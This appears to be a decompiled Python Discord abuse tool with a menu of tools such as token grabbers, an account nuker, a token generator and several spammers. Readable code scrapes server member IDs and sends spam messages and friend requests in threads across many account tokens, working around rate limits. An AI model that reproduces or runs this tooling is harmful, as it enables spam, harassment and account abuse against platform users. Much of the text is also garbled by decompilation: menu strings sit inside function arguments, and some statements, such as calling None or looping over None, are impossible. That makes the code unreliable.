'][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['30'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' About'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['7'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Account Nuker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['15'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['23'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Auto Login'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['31'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']']):
                bot.gateway.fetchMembers(guild_id, channel_id, 'all', 1, **('keep', 'wait'))
                bot.gateway.command({
                    'function': close_after_fetching,
                    'params': {
                        'guild_id': guild_id } })
                bot.gateway.run()
                bot.gateway.resetSession()
                return bot.gateway.session.guild(guild_id).members

            members = get_members(server, channel)
            memberslist = []
            for memberID in members:
                memberslist.append(memberID)
                print(memberID)
            f = open('data/users.txt', 'w')
            for element in memberslist:
                f.write(f'''<@{element}>''' + '\n')
            f.close()
        
        def spam(token = []['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['1'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Joiner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['9'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}''']['  Channel Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['17'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Status Changer'][f'''{Fore.RESET}''']['      '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['25'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Generator'][f'''{Fore.RESET}''']['             '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['>'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Next Page'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['2'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Leaver   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['10'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['18'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Bio Changer'][f'''{Fore.RESET}''']['         '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['26'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Nitro Generator'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['3'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Checker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['11'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Friend Spammer    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['19'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Lookup'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['27'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' QR Token Grabber'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['4'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Onliner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['12'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' HypeSquad Joiner  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['20'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Infomation'][f'''{Fore.RESET}''']['    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['28'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Member ID Scraper'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['5'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Grabber   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['13'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Reaction Spammer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['21'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' GroupChat DC'][f'''{Fore.RESET}''']['        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['29'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' PFP Changer'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['6'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server MassDM   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['14'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' NickName Changer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['22'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Group Spammer'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['30'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' About'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['7'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Account Nuker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['15'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['23'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Auto Login'], mess = []['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['1'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Joiner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['9'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}''']['  Channel Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['17'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Status Changer'][f'''{Fore.RESET}''']['      '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['25'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Generator'][f'''{Fore.RESET}''']['             '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['>'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Next Page'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['2'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Leaver   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['10'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['18'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Bio Changer'][f'''{Fore.RESET}''']['         '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['26'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Nitro Generator'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['3'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Checker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['11'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Friend Spammer    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['19'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Lookup'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['27'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' QR Token Grabber'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['4'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Onliner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['12'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' HypeSquad Joiner  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['20'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Infomation'][f'''{Fore.RESET}''']['    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['28'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Member ID Scraper'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['5'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Grabber   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['13'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Reaction Spammer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['21'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' GroupChat DC'][f'''{Fore.RESET}''']['        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['29'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' PFP Changer'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['6'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server MassDM   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['14'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' NickName Changer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['22'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Group Spammer'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['30'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' About'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['7'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Account Nuker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['15'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['23'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Auto Login'][f'''{Fore.RESET}''']):
            if mas == 'y':
                with open('data/users.txt', 'r') as file:
                    allText = file.read()
                    words = list(map(str, allText.split()))
                    mess += ''.join(random.choice(words))
                    None(None, None, None)
                if not None:
                    pass
            if ch == 'y':
                mess += ' | ' + ''.join(random.choices(string.ascii_lowercase + string.digits, 5, **('k',)))
            elif ch == 'n':
                pass
            
            url = 'https://discord.com/api/v9/channels/' + channel + '/messages'
            payload = {
                'content': mess,
                'tts': False }
            header = mainHeader(token)
            time.sleep(delay)
            src = requests.post(url, header, payload, **('headers', 'json'))
            if src.status_code == 429:
                ratelimit = json.loads(src.content)
                print(f'''{Fore.LIGHTRED_EX}[!]{Fore.RESET} Ratelimit for''', str(float(ratelimit['retry_after'])) + ' seconds')
                time.sleep(float(ratelimit['retry_after']))
            elif src.status_code == 200:
                print(f'''[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Sent: {mess}''')
            elif src.status_code == 401:
                print(f'''[{Fore.LIGHTRED_EX}!{Fore.RESET}] Invalid Token''')
            elif src.status_code == 404:
                print(f'''[{Fore.LIGHTRED_EX}!{Fore.RESET}] Not Found''')
            elif src.status_code == 403:
                print(f'''[{Fore.LIGHTRED_EX}!{Fore.RESET}] Token Doesnt Have Perms For This Channel!''')
            continue

        
        def thread():
            text = mess
            for token in tokens:
                threading.Thread(spam, (token, text), **('target', 'args')).start()

        start = input('\n[\x1b[95m>\x1b[95m\x1b[37m] Press ENTER To Start: ')
        start = thread()
        time.sleep(2)
        exit = input('[\x1b[95m>\x1b[95m\x1b[37m] Press ENTER: ')
        clear()
        exit = spammer()
    if choice == '10':
        Spinner()
        print(f'''\n[{lr}!{w}] DM Spammer is Currently Down... Updating Soon!''')
        time.sleep(2)
        exit = input('[\x1b[95m>\x1b[95m\x1b[37m] Press ENTER: ')
        clear()
        exit = spammer()
    if choice == '11':
        Spinner()
        
        def friender(token, user):
            
            try:
                user = user.split('#')
                headers = mainHeader(token)
                payload = {
                    'username': user[0],
                    'discriminator': user[1] }
                src = requests.post('https://discord.com/api/v9/users/@me/relationships', headers, payload, **('headers', 'json'))
                if src.status_code == 204:
                    print(f'''[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Friend Request Sent to {user[0]}#{user[1]}! ''')
            finally:
                return None
                return None
                Exception
                e = None
                
                try:
                    print(e)
                finally:
                    e = None
                    del e
                    return None
                    e = None
                    del e



        user = input('\n[\x1b[95m>\x1b[95m\x1b[37m] Username + Tag [Example: gangnuker#1234]: ')
        tokens = open('tokens.txt', 'r').read().splitlines()
        delay = float(input('[\x1b[95m>\x1b[95m\x1b[37m] Delay: '))
        for None in tokens:
            token = None
            threading.Thread(friender, (token, user), **('target', 'args')).start()
        time.sleep(1)
        exit = input('[\x1b[95m>\x1b[95m\x1b[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()
    if choice == '12':
        Spinner()
        print(f'''\n[\x1b[95m1\x1b[95m\x1b[37m] {Fore.MAGENTA}Bravery{Fore.RESET}\n[\x1b[95m2\x1b[95m\x1b[37m] {Fore.LIGHTRED_EX}Brilliance{Fore.RESET}\n[\x1b[95m3\x1b[95m\x1b[37m] {Fore.LIGHTCYAN_EX}Balance{Fore.RESET}\n[\x1b[95m4\x1b[95m\x1b[37m] Leave The HypeSquad''')
        house = input('\n[\x1b[95m>\x1b[95m\x1b[37m] Choice: ')
        
        def hype(token = []['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['1'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Joiner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['9'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}''']['  Channel Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['17'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Status Changer'][f'''{Fore.RESET}''']['      '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['25'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Generator'][f'''{Fore.RESET}''']['             '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['>'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Next Page'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['2'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Leaver   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['10'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['18'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Bio Changer'][f'''{Fore.RESET}''']['         '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['26'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Nitro Generator'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['3'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Checker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['11'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Friend Spammer    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['19'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Lookup'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['27'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' QR Token Grabber'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['4'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Onliner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['12'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' HypeSquad Joiner  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['20'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Infomation'][f'''{Fore.RESET}''']['    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['28'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Member ID Scraper'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['5'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Grabber   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['13'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Reaction Spammer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['21'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' GroupChat DC'][f'''{Fore.RESET}''']['        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['29'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' PFP Changer'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['6'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server MassDM   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['14'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' NickName Changer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['22'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Group Spammer'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['30'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' About'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['7'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Account Nuker   